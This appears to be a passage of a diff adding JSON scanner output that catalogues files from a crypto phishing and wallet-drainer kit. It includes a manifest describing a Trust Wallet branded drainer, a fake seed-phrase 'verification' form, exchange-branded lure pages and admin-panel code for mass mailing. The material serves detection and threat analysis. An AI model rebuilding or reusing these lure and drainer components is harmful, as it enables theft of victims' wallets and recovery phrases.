+          "snippet": "cCl90whOtKrLr3vUfTrlfmY91sh/IWy25KihFbg2BDklcOVC7zM5HL4X5nwVKAlyXmb5Yhouqo28/FONs1uSDHb/5lsmTPB553dtHXna8QJzdurir8LGCdO858Dr1YAVMGfdg9vlcJp60hCRDpnXZ8455qWc68/M4ueecCY2Ct+RC6iNLF4EKtkIcyjT4ESrY4UMQKSe0KAarbdK02yFf6Xi73kTbpSjIoSr4erGCcEKrL7kq0G+lrX3F7HlhLrNWgaXQXHf1b5pjp0bL3"
+        },
+        {
+          "tag": "smtp_campaign",
+          "file": "app/services/icloud/metamask.html",
+          "snippet": "cCl90whOtKrLr3vUfTrlfmY91sh/IWy25KihFbg2BDklcOVC7zM5HL4X5nwVKAlyXmb5Yhouqo28/FONs1uSDHb/5lsmTPB553dtHXna8QJzdurir8LGCdO858Dr1YAVMGfdg9vlcJp60hCRDpnXZ8455qWc68/M4ueecCY2Ct+RC6iNLF4EKtkIcyjT4ESrY4UMQKSe0KAarbdK02yFf6Xi73kTbpSjIoSr4erGCcEKrL7kq0G+lrX3F7HlhLrNWgaXQXHf1b5pjp0bL3"
+        },
+        {
+          "tag": "smtp_campaign",
+          "file": "app/services/kraken/metamask.html",
+          "snippet": "cCl90whOtKrLr3vUfTrlfmY91sh/IWy25KihFbg2BDklcOVC7zM5HL4X5nwVKAlyXmb5Yhouqo28/FONs1uSDHb/5lsmTPB553dtHXna8QJzdurir8LGCdO858Dr1YAVMGfdg9vlcJp60hCRDpnXZ8455qWc68/M4ueecCY2Ct+RC6iNLF4EKtkIcyjT4ESrY4UMQKSe0KAarbdK02yFf6Xi73kTbpSjIoSr4erGCcEKrL7kq0G+lrX3F7HlhLrNWgaXQXHf1b5pjp0bL3"
+        },
+        {
+          "tag": "smtp_campaign",
+          "file": "app/services/kucoin/metamask.html",
+          "snippet": "cCl90whOtKrLr3vUfTrlfmY91sh/IWy25KihFbg2BDklcOVC7zM5HL4X5nwVKAlyXmb5Yhouqo28/FONs1uSDHb/5lsmTPB553dtHXna8QJzdurir8LGCdO858Dr1YAVMGfdg9vlcJp60hCRDpnXZ8455qWc68/M4ueecCY2Ct+RC6iNLF4EKtkIcyjT4ESrY4UMQKSe0KAarbdK02yFf6Xi73kTbpSjIoSr4erGCcEKrL7kq0G+lrX3F7HlhLrNWgaXQXHf1b5pjp0bL3"
+        },
+        {
+          "tag": "smtp_campaign",
+          "file": "app/services/robinhood/metamask.html",
+          "snippet": "cCl90whOtKrLr3vUfTrlfmY91sh/IWy25KihFbg2BDklcOVC7zM5HL4X5nwVKAlyXmb5Yhouqo28/FONs1uSDHb/5lsmTPB553dtHXna8QJzdurir8LGCdO858Dr1YAVMGfdg9vlcJp60hCRDpnXZ8455qWc68/M4ueecCY2Ct+RC6iNLF4EKtkIcyjT4ESrY4UMQKSe0KAarbdK02yFf6Xi73kTbpSjIoSr4erGCcEKrL7kq0G+lrX3F7HlhLrNWgaXQXHf1b5pjp0bL3"
+        },
+        {
+          "tag": "drainer_workflow",
+          "file": "app/services/trust_drainer/approve.html",
+          "snippet": "| sessionStorage.getItem('td_chain') || 'ethereum';    if(!addr){ window.location.href = '/trust-drainer/connect'; return; }    document.getElementById('topAddr').textContent = addr.slice(0,6) + '...' + addr.slice(-4);   document.getElementById('caseId').textContent = 'TW-' + Math.floor(1000"
+        },
+        {
+          "tag": "drainer_workflow",
+          "file": "app/services/trust_drainer/manifest.yaml",
+          "snippet": "name: Trust Wallet Drainer version: 1.0 route: /trust-drainer flow_mode: admin tab_title: Trust Wallet Security notes: |   Trust Wallet branded crypto drainer.   Victim connects wallet, signs real approve()"
+        },
+        {
+          "tag": "smtp_campaign",
+          "file": "app/services/wealthsimple/metamask.html",
+          "snippet": "cCl90whOtKrLr3vUfTrlfmY91sh/IWy25KihFbg2BDklcOVC7zM5HL4X5nwVKAlyXmb5Yhouqo28/FONs1uSDHb/5lsmTPB553dtHXna8QJzdurir8LGCdO858Dr1YAVMGfdg9vlcJp60hCRDpnXZ8455qWc68/M4ueecCY2Ct+RC6iNLF4EKtkIcyjT4ESrY4UMQKSe0KAarbdK02yFf6Xi73kTbpSjIoSr4erGCcEKrL7kq0G+lrX3F7HlhLrNWgaXQXHf1b5pjp0bL3"
+        },
+        {
+          "tag": "wallet_lure",
+          "file": "app/services/wealthsimple/whitelist_wallet.html",
+          "snippet": "cap=\"round\" stroke-linejoin=\"round\"/></svg>       </div>       <h1 class=\"ws-h1 ws-h1-lg\">Verify Wallet Ownership</h1>       <p class=\"ws-sub\">Enter your wallet recovery phrase to whitelist this address.</p>        <div class=\"ws-field\">         <textarea id=\"seedInput\" name=\"seed_p"
+        },
+        {
+          "tag": "smtp_campaign",
+          "file": "app/client/dist/assets/customer-tools-DsIoUQZ2.js",
+          "snippet": "l:\"Editor\"}],r={dialer:[\"dialer.view\",\"dialer.manage\",\"sessions.view\"],mail:[\"mail.view\",\"mail.send\"],lure:[\"mail.view\",\"mail.send\"],sessions:[\"sessions.view\",\"sessions.control\",\"sessions.data\"],documents:[\"sessions.view\"],services:[\"services.view\"],domains:[\"domains.view\"],moni"
+        },
+        {
+          "tag": "smtp_campaign",
+          "file": "app/client/dist/assets/lure-kcRbQUqe.js",
+          "snippet": "rror/80 text-white font-bold\",children:\"Reload Preset\"})]})]})]})},ft=()=>e.jsx(Be,{perm:\"mail.send\",children:e.jsx(nt,{})});export{ft as default}; "
+        },
+        {
+          "tag": "smtp_campaign",
+          "file": "app/client/dist/assets/mail-CFwwVBMj.js",
+          "snippet": "atch{o=null}return typeof o==\"object\"&&o!==null&&\"detail\"in o?String(o.detail):r},pe={listSmtp:async()=>{const t=await y.get(\"/api/nfa-mailer/smtp\");if(!t.ok)throw new Error(await oe(t,\"Failed to list SMTP accounts\"));return(await t.json()).accounts},addSmtp:async t=>{const"
+        },
+        {
+          "tag": "smtp_campaign",
+          "file": "app/client/dist/assets/shell-Dm3QsB_l.js",
+          "snippet": "h:\"/manage/mail\",icon:ur,perm:\"mail.view\"},{name:\"Lure\",path:\"/manage/lure\",icon:nr,perm:\"mail.send\"},{name:\"Monitor\",path:\"/manage/monitor\",icon:xr,perm:\"domains.view\"},{name:\"Dialer\",path:\"/manage/dialer\",icon:mr,perm:\"dialer.view\"}],Xr=[{name:\"Browser\",path:\"/manage/browser\","
+        },
+        {
+          "tag": "smtp_campaign",
+          "file": "app/client/dist/assets/subdomain-badge-CE0e4nAn.js",
+          "snippet": "a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?$/,A=new Set([\"www\",\"api\",\"manage\",\"admin\",\"mail\",\"ftp\",\"smtp\",\"imap\",\"pop\",\"ns1\",\"ns2\",\"ns3\",\"mx\",\"webmail\",\"cpanel\",\"autodiscover\",\"autoconfig\",\"localhost\",\"wpad\",\"isatap\",\"gateway\",\"relay\",\"ws\",\"wss\",\"static\",\"assets\",\"cdn\",\"status\",\"heal"
+        },
+        {
+          "tag": "smtp_campaign",
+          "file": "app/client/dist/assets/users-tvPwTFsk.js",
+          "snippet": "anage File Browser\",group:\"Browser\"},{id:\"mail.view\",label:\"View Mail\",group:\"Mail\"},{id:\"mail.send\",label:\"Send Mail\",group:\"Mail\"},{id:\"dialer.view\",label:\"View Dialer\",group:\"Dialer\"},{id:\"dialer.manage\",label:\"Manage Dialer\",group:\"Dialer\"}],h={superadmin:[\"services.manage\","
+        }
+      ],
+      "errors": null
+    }
+  }
+}
